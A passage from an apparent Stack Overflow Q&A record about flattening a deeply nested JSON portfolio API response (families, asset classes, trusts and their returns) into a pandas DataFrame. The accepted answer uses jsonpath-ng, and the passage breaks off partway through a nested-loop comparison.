\"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.03037038746301135,\n                                        \"time_weighted_return_2\": -0.03037038746301135,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 114472.69744\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.030370390035505124,\n                                                \"time_weighted_return_2\": -0.030370390035505124,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 114472.68744000001\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0,\n                                                \"time_weighted_return_2\": 0,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 0.01\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class D\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.06604362523792162,\n                                        \"time_weighted_return_2\": -0.06604362523792162,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 5722529.229999997\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.06154960593668424,\n                                                \"time_weighted_return_2\": -0.06154960593668424,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1191838.9399999995\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.06750460387418267,\n                                                \"time_weighted_return_2\": -0.06750460387418267,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 4416618.520000002\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.05604507809250081,\n                                                \"time_weighted_return_2\": -0.05604507809250081,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 38190.33\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.05604507809250081,\n                                                \"time_weighted_return_2\": -0.05604507809250081,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 37940.72\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.05604507809250081,\n                                                \"time_weighted_return_2\": -0.05604507809250081,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 37940.72\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class E\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.017118805423322003,\n                                        \"time_weighted_return_2\": -0.017118805423322003,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 3148495.0914600003\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.015251157805867277,\n                                                \"time_weighted_return_2\": -0.015251157805867277,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 800493.06146\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.01739609576880241,\n                                                \"time_weighted_return_2\": -0.01739609576880241,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 2215511.2700000005\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.02085132265594647,\n                                                \"time_weighted_return_2\": -0.02085132265594647,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44031.21\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.02089393244695803,\n                                                \"time_weighted_return_2\": -0.02089393244695803,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44394.159999999996\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.020607507059866248,\n                                                \"time_weighted_return_2\": -0.020607507059866248,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44065.39000000001\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class F\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.0014710489231547497,\n                                        \"time_weighted_return_2\": -0.0014710489231547497,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 198260.12\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.0014477244560456848,\n                                                \"time_weighted_return_2\": -0.0014477244560456848,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44612.33\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.001477821083437858,\n                                                \"time_weighted_return_2\": -0.001477821083437858,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 153647.78999999998\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                }\n                            ]\n                        }\n                    ]\n                }]\n            }\n        },\n        \"included\": []\n    }\n}\n\nNotes on JSON Object extract\n\ndata - data in here can be ignored, these are aggregated values for underlying children.\nmeta - columns \u2013 contains the column header values I want to use for each applicable children \u2018column` key:pair values.\ngroupings - can be ignored.\nchildren hierarchy \u2013 there are 4x levels of children which can be identified by their name as follows \u2013\n\nFamily name (i.e., \u2018Falconer Family\u2019)\nWealth Bucket name (e.g., \u2018Wealth Bucket A\u2019)\nAsset Class name (e.g., \u2018Asset Class A\u2019)\nFund name (e.g., \u2018HUDJ Trust\u2019)\n\n\n\nTarget Outputthis is an extract of target df structure I am trying to achieve -\n\n\n\n\nportfolio\nname\nentity_id\nAdjusted Value (No Div, USD)\nCurrent Quarter TWR (USD)\nYTD TWR (USD)\nTWR Audit Note\n\n\n\n\nFalconer Family\nFalconer Family\n\n23132492.90510712\n-0.046732301295604683\n-0.046732301295604683\nNone\n\n\nFalconer Family\nWealth Bucket A\n\n13264448.506587146\n-0.045960317420568164\n-0.045960317420568164\nNone\n\n\nFalconer Family\nAsset Class A\n\n3337.99\n0.000003434094574039648\n0.000003434094574039648\nNone\n\n\nFalconer Family\nHUDJ Trust\n10604454\n3337.99\n0.000003434094574039648\n0.000003434094574039648\nNone\n\n\nFalconer Family\nAsset Class B\n\n1017004.7192636987\n-0.025871339096964152\n-0.025871339096964152\nNone\n\n\nFalconer Family\nHUDG Trust\n10604454\n1017004.7192636987\n-0.025871339096964152\n-0.025871339096964152\nNone\n\n\nFalconer Family\nAsset Class C\n\n231142.67772000004\n-0.030370376329670656\n-0.030370376329670656\nNone\n\n\nFalconer Family\nHKDJ Trust\n10604454\n231142.67772000004\n-0.030370376329670656\n-0.030370376329670656\nNone\n\n\nFalconer Family\nAsset Class D\n\n9791282.570000006\n-0.05382756475465478\n-0.05382756475465478\nNone\n\n\nFalconer Family\nHUDW Trust\n10604454\n9791282.570000006\n-0.05382756475465478\n-0.05382756475465478\nNone\n\n\n\n\nNotes on Target Output\n\nPortfolio header \u2013 for every row, I would like to map the top-level children name value [family name]. E.g., \u2018Falconer Family.\nName header \u2013 this should simply be the name value from each respective children.\nEntity ID \u2013 all 4th level children entity_id value should be mapped to this column.\nData columns \u2013 regardless of level, all children have identical time_weighted_return, time-weighted_return2 and value columns which should be mapped respectively.\nTWR Audit Note \u2013 these children _custom_twr_audit_note_911318 values are currently blank, but will be utilized in the future.\n\nCurrent OutputMy main issue is that you can see that I have only been able to tap into the 1st [Family] and 2nd [Wealth Bucket] children level. This leaves me missing the 3rd [Asset Class] and 4th [Fund] -\n\n\n\n\n\nportfolio\nname\nAdjusted Value (No Div, USD)\nCurrent Quarter TWR (USD)\nYTD TWR (USD)\nTWR Audit Note)\n\n\n\n\n0\nFalconer Family\nFalconer Family\n2.313249e+07\n-0.046732\n-0.046732\nNone\n\n\n1\nFalconer Family\nWealth Bucket A\n1.326445e+07\n-0.045960\n-0.045960\nNone\n\n\n2\nFalconer Family\nWealth Bucket B\n9.868044e+06\n-0.047699\n-0.047699\nNone\n\n\n\n\nCurrent codeThis is a function which gets me the correct df formatting, however my main issue is that I haven't been able to find a solution to returning all children, but rather only the top-level -\n# Function to read API response / JSON Object\ndef response_writer():\n    with open('api_response_2022-02-13.json') as f:\n        api_response = json.load(f)\n        return api_response\n\n# Function to unpack JSON response into pandas dataframe.\ndef unpack_response():\n    while True:\n        try:\n            api_response = response_writer()\n            portfolio_views_children = api_response['data']['attributes']['total']['children']\n            portfolios = []\n            for portfolio in portfolio_views_children:\n                entity_columns = []\n                # include portfolio itself within an iterable so the total is the header\n                for entity in itertools.chain([portfolio], portfolio[\"children\"]):\n                    entity_data = entity[\"columns\"].copy()  # don't mutate original response\n                    entity_data[\"portfolio\"] = portfolio[\"name\"]   # from outer\n                    entity_data[\"name\"]      = entity[\"name\"]\n                    entity_columns.append(entity_data)\n\n                df = pd.DataFrame(entity_columns)\n                portfolios.append(df)\n\n            # combine dataframes\n            df = pd.concat(portfolios)\n            # reorder and rename\n            column_ordering = {\"portfolio\": \"portfolio\", \"name\": \"name\"}\n            column_ordering.update({c[\"key\"]: c[\"display_name\"] for c in api_response[\"meta\"][\"columns\"]})\n            df = df[column_ordering.keys()]   # beware: un-named cols will be dropped\n            df = df.rename(columns=column_ordering)\n            break\n        except KeyError:\n            print(\"-----------------------------------\\n\",\"API TIMEOUT ERROR: TRY AGAIN...\", \"\\n-----------------------------------\\n\")\n    return df\nunpack_response()\n\nHelpIn short, I am looking for some advice on how I can tap into the remaining children by enhancing the existing code. Whilst I have taken much time to fully explain my problem, please ask if anything isn't clear. Please note that the JSON may have multiple families, so the solution / advice offered must observe this\n",
    "AcceptedAnswerId": 71136605,
    "AcceptedAnswer": "jsonpath-ng can parse even such a nested json object very easily. You can install this convenient library by the following command:\npip install --upgrade jsonpath-ng\n\nCode:\nimport json\nimport jsonpath_ng as jp\nimport pandas as pd\n\ndef unpack_response(r):\n    # Create a dataframe from extracted data\n    expr = jp.parse('$..children.[*]')\n    data = [{'full_path': str(m.full_path), **m.value} for m in expr.find(r)]\n    df = pd.json_normalize(data).sort_values('full_path', ignore_index=True)\n\n    # Append a portfolio column\n    df['portfolio'] = df.loc[df.full_path.str.contains(r'total\\.children\\.\\[\\d+]$'), 'name']\n    df['portfolio'].fillna(method='ffill', inplace=True)\n\n    # Deal with columns\n    trans = {'columns.' + c['key']: c['display_name'] for c in r['meta']['columns']}\n    cols = ['full_path', 'portfolio', 'name', 'entity_id', 'Adjusted Value (No Div, USD)', 'Current Quarter TWR (USD)', 'YTD TWR (USD)', 'TWR Audit Note']\n    df = df.rename(columns=trans)[cols]\n\n    return df\n\n# Load the sample data from file\n# with open('api_response_2022-02-13.json', 'r') as f:\n#     api_response = json.load(f)\n\n# Load the sample data from string\napi_response = json.loads('{\"meta\": {\"columns\": [{\"key\": \"value\", \"display_name\": \"Adjusted Value (No Div, USD)\", \"output_type\": \"Number\", \"currency\": \"USD\"}, {\"key\": \"time_weighted_return\", \"display_name\": \"Current Quarter TWR (USD)\", \"output_type\": \"Percent\", \"currency\": \"USD\"}, {\"key\": \"time_weighted_return_2\", \"display_name\": \"YTD TWR (USD)\", \"output_type\": \"Percent\", \"currency\": \"USD\"}, {\"key\": \"_custom_twr_audit_note_911328\", \"display_name\": \"TWR Audit Note\", \"output_type\": \"Word\"}], \"groupings\": [{\"key\": \"_custom_name_747205\", \"display_name\": \"* Reporting Client Name\"}, {\"key\": \"_custom_new_entity_group_453577\", \"display_name\": \"NEW Entity Group\"}, {\"key\": \"_custom_level_2_624287\", \"display_name\": \"* Level 2\"}, {\"key\": \"legal_entity\", \"display_name\": \"Legal Entity\"}]}, \"data\": {\"type\": \"portfolio_views\", \"attributes\": {\"total\": {\"name\": \"Total\", \"columns\": {\"time_weighted_return\": -0.046732301295604683, \"time_weighted_return_2\": -0.046732301295604683, \"_custom_twr_audit_note_911328\": null, \"value\": 23132492.905107163}, \"children\": [{\"name\": \"Falconer Family\", \"grouping\": \"_custom_name_747205\", \"columns\": {\"time_weighted_return\": -0.046732301295604683, \"time_weighted_return_2\": -0.046732301295604683, \"_custom_twr_audit_note_911328\": null, \"value\": 23132492.905107163}, \"children\": [{\"name\": \"Wealth Bucket A\", \"grouping\": \"_custom_new_entity_group_453577\", \"columns\": {\"time_weighted_return\": -0.045960317420568164, \"time_weighted_return_2\": -0.045960317420568164, \"_custom_twr_audit_note_911328\": null, \"value\": 13264448.506587159}, \"children\": [{\"name\": \"Asset Class A\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": 3.434094574039648e-06, \"time_weighted_return_2\": 3.434094574039648e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 3337.99}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HUDJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 3.434094574039648e-06, \"time_weighted_return_2\": 3.434094574039648e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 3337.99}, \"children\": []}]}, {\"name\": \"Asset Class B\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.025871339096964152, \"time_weighted_return_2\": -0.025871339096964152, \"_custom_twr_audit_note_911328\": null, \"value\": 1017004.7192636987}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HUDG Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.025871339096964152, \"time_weighted_return_2\": -0.025871339096964152, \"_custom_twr_audit_note_911328\": null, \"value\": 1017004.7192636987}, \"children\": []}]}, {\"name\": \"Asset Class C\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.030370376329670656, \"time_weighted_return_2\": -0.030370376329670656, \"_custom_twr_audit_note_911328\": null, \"value\": 231142.67772000004}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HKDJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.030370376329670656, \"time_weighted_return_2\": -0.030370376329670656, \"_custom_twr_audit_note_911328\": null, \"value\": 231142.67772000004}, \"children\": []}]}, {\"name\": \"Asset Class D\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.05382756475465478, \"time_weighted_return_2\": -0.05382756475465478, \"_custom_twr_audit_note_911328\": null, \"value\": 9791282.570000006}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HUDW Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05382756475465478, \"time_weighted_return_2\": -0.05382756475465478, \"_custom_twr_audit_note_911328\": null, \"value\": 9791282.570000006}, \"children\": []}]}, {\"name\": \"Asset Class E\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.01351630404081805, \"time_weighted_return_2\": -0.01351630404081805, \"_custom_twr_audit_note_911328\": null, \"value\": 2153366.6396034593}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HJDJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.01351630404081805, \"time_weighted_return_2\": -0.01351630404081805, \"_custom_twr_audit_note_911328\": null, \"value\": 2153366.6396034593}, \"children\": []}]}, {\"name\": \"Asset Class F\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.002298190175237247, \"time_weighted_return_2\": -0.002298190175237247, \"_custom_twr_audit_note_911328\": null, \"value\": 68313.90999999999}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HADJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.002298190175237247, \"time_weighted_return_2\": -0.002298190175237247, \"_custom_twr_audit_note_911328\": null, \"value\": 68313.90999999999}, \"children\": []}]}]}, {\"name\": \"Wealth Bucket B\", \"grouping\": \"_custom_new_entity_group_453577\", \"columns\": {\"time_weighted_return\": -0.04769870075659244, \"time_weighted_return_2\": -0.04769870075659244, \"_custom_twr_audit_note_911328\": null, \"value\": 9868044.398519998}, \"children\": [{\"name\": \"Asset Class A\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": 2.8632718065191298e-05, \"time_weighted_return_2\": 2.8632718065191298e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 10234.94}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 2.82679297198829e-05, \"time_weighted_return_2\": 2.82679297198829e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 244.28}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 4.9373572795108345e-05, \"time_weighted_return_2\": 4.9373572795108345e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 5081.08}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 6.609603754315074e-06, \"time_weighted_return_2\": 6.609603754315074e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 1523.62}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 1.0999769004760296e-05, \"time_weighted_return_2\": 1.0999769004760296e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 1828.9}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 6.466673995619843e-06, \"time_weighted_return_2\": 6.466673995619843e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 1557.06}, \"children\": []}]}, {\"name\": \"Asset Class B\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.024645947842438676, \"time_weighted_return_2\": -0.024645947842438676, \"_custom_twr_audit_note_911328\": null, \"value\": 674052.31962}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.043304004172576405, \"time_weighted_return_2\": -0.043304004172576405, \"_custom_twr_audit_note_911328\": null, \"value\": 52800.96}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.022408434778798836, \"time_weighted_return_2\": -0.022408434778798836, \"_custom_twr_audit_note_911328\": null, \"value\": 599594.11962}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.039799855483646174, \"time_weighted_return_2\": -0.039799855483646174, \"_custom_twr_audit_note_911328\": null, \"value\": 7219.08}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.039799855483646174, \"time_weighted_return_2\": -0.039799855483646174, \"_custom_twr_audit_note_911328\": null, \"value\": 7219.08}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.039799855483646174, \"time_weighted_return_2\": -0.039799855483646174, \"_custom_twr_audit_note_911328\": null, \"value\": 7219.08}, \"children\": []}]}, {\"name\": \"Asset Class C\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.03037038746301135, \"time_weighted_return_2\": -0.03037038746301135, \"_custom_twr_audit_note_911328\": null, \"value\": 114472.69744}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.030370390035505124, \"time_weighted_return_2\": -0.030370390035505124, \"_custom_twr_audit_note_911328\": null, \"value\": 114472.68744000001}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 0, \"time_weighted_return_2\": 0, \"_custom_twr_audit_note_911328\": null, \"value\": 0.01}, \"children\": []}]}, {\"name\": \"Asset Class D\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.06604362523792162, \"time_weighted_return_2\": -0.06604362523792162, \"_custom_twr_audit_note_911328\": null, \"value\": 5722529.229999997}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.06154960593668424, \"time_weighted_return_2\": -0.06154960593668424, \"_custom_twr_audit_note_911328\": null, \"value\": 1191838.9399999995}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.06750460387418267, \"time_weighted_return_2\": -0.06750460387418267, \"_custom_twr_audit_note_911328\": null, \"value\": 4416618.520000002}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05604507809250081, \"time_weighted_return_2\": -0.05604507809250081, \"_custom_twr_audit_note_911328\": null, \"value\": 38190.33}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05604507809250081, \"time_weighted_return_2\": -0.05604507809250081, \"_custom_twr_audit_note_911328\": null, \"value\": 37940.72}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05604507809250081, \"time_weighted_return_2\": -0.05604507809250081, \"_custom_twr_audit_note_911328\": null, \"value\": 37940.72}, \"children\": []}]}, {\"name\": \"Asset Class E\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.017118805423322003, \"time_weighted_return_2\": -0.017118805423322003, \"_custom_twr_audit_note_911328\": null, \"value\": 3148495.0914600003}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.015251157805867277, \"time_weighted_return_2\": -0.015251157805867277, \"_custom_twr_audit_note_911328\": null, \"value\": 800493.06146}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.01739609576880241, \"time_weighted_return_2\": -0.01739609576880241, \"_custom_twr_audit_note_911328\": null, \"value\": 2215511.2700000005}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.02085132265594647, \"time_weighted_return_2\": -0.02085132265594647, \"_custom_twr_audit_note_911328\": null, \"value\": 44031.21}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.02089393244695803, \"time_weighted_return_2\": -0.02089393244695803, \"_custom_twr_audit_note_911328\": null, \"value\": 44394.159999999996}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.020607507059866248, \"time_weighted_return_2\": -0.020607507059866248, \"_custom_twr_audit_note_911328\": null, \"value\": 44065.39000000001}, \"children\": []}]}, {\"name\": \"Asset Class F\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.0014710489231547497, \"time_weighted_return_2\": -0.0014710489231547497, \"_custom_twr_audit_note_911328\": null, \"value\": 198260.12}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.0014477244560456848, \"time_weighted_return_2\": -0.0014477244560456848, \"_custom_twr_audit_note_911328\": null, \"value\": 44612.33}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.001477821083437858, \"time_weighted_return_2\": -0.001477821083437858, \"_custom_twr_audit_note_911328\": null, \"value\": 153647.78999999998}, \"children\": []}]}]}]}]}}, \"included\": []}}')\n\ndf = unpack_response(api_response)\n\nExplanation:\nFirstly, you can confirm the expected output by the following command:\nprint(df.iloc[:5:,1:])\n\n\n\n\n\nportfolio\nname\nentity_id\nAdjusted Value (No Div, USD)\nCurrent Quarter TWR (USD)\nYTD TWR (USD)\nTWR Audit Note\n\n\n\n\nFalconer Family\nFalconer Family\nnan\n2.31325e+07\n-0.0467323\n-0.0467323\n\n\n\nFalconer Family\nWealth Bucket A\nnan\n1.32644e+07\n-0.0459603\n-0.0459603\n\n\n\nFalconer Family\nAsset Class A\nnan\n3337.99\n3.43409e-06\n3.43409e-06\n\n\n\nFalconer Family\nHUDJ Trust\n1.06045e+07\n3337.99\n3.43409e-06\n3.43409e-06\n\n\n\nFalconer Family\nAsset Class B\nnan\n1.017e+06\n-0.0258713\n-0.0258713\n\n\n\n\n\nSubsequently, you can see one of the wonderful features in jsonpath-ng by the following command:\nprint(df.iloc[:10,:3])\n\n\n\n\n\nfull_path\nportfolio\nname\n\n\n\n\ndata.attributes.total.children.[0]\nFalconer Family\nFalconer Family\n\n\ndata.attributes.total.children.[0].children.[0]\nFalconer Family\nWealth Bucket A\n\n\ndata.attributes.total.children.[0].children.[0].children.[0]\nFalconer Family\nAsset Class A\n\n\ndata.attributes.total.children.[0].children.[0].children.[0].children.[0]\nFalconer Family\nHUDJ Trust\n\n\ndata.attributes.total.children.[0].children.[0].children.[1]\nFalconer Family\nAsset Class B\n\n\ndata.attributes.total.children.[0].children.[0].children.[1].children.[0]\nFalconer Family\nHUDG Trust\n\n\ndata.attributes.total.children.[0].children.[0].children.[2]\nFalconer Family\nAsset Class C\n\n\ndata.attributes.total.children.[0].children.[0].children.[2].children.[0]\nFalconer Family\nHKDJ Trust\n\n\ndata.attributes.total.children.[0].children.[0].children.[3]\nFalconer Family\nAsset Class D\n\n\ndata.attributes.total.children.[0].children.[0].children.[3].children.[0]\nFalconer Family\nHUDW Trust\n\n\n\n\nThanks to the full_path column, you can grasp the nesting level of the extracted data in each row instantaneously. Actually, I appended the correct portfolio values by using these paths.\nIn terms of the code, the key point is the following line:\nexpr = jp.parse('$..children.[*]')\n\nBy the above expression, you can search the children attributes at any level of the json object. README.rst tells you what each syntax stands for.\n\n\n\n\nSyntax\nMeaning\n\n\n\n\n$\nThe root object\n\n\njsonpath1 .. jsonpath2\nAll nodes matched by jsonpath2 that descend from any node matching jsonpath1\n\n\n[*]\nany array index\n\n\n\nSpeed:\nI compared the speed between the above method with jsonpath-ng and a nested-for-loop method shown below.\n# Comparison:\n\n\n\n\nMethod\nDuration\nSpeed ratio\n\n\n\n\njsonpath-ng\n9.72 ms \u00b1 342 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 100 loops each)\n5.7 (faster)\n\n\nNested-for-loop\n55.4 ms \u00b1 7.39 ms per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n1\n\n\n\n# Code of the nested-for-loop method:\ndef unpack_response(r):\n    df = pd.DataFrame()\n    for _, r1 in pd.json_normalize(r, ['data', 'attributes', 'total', 